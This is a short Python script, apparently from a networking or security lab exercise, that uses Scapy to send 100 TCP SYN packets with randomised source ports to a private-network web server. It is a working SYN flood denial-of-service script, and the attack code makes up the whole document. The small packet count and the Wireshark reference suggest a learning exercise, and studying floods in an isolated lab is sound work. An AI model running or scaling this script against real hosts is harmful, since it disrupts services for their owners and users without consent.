from scapy.all import IP, TCP, send
import random

target_ip = "192.168.56.104"
target_port = 80

print(f"Starting Scapy SYN flood on {target_ip}:{target_port}...")

# Sending 100 raw SYN packets
for i in range(100):
    # We craft the packet layer by layer
    # sport=random... makes it look like many different clients
    packet = IP(dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=target_port, flags="S")
    
    # send() sends the packet at layer 3 (IP)
    send(packet, verbose=False)

print("Done! Check Wireshark now.")
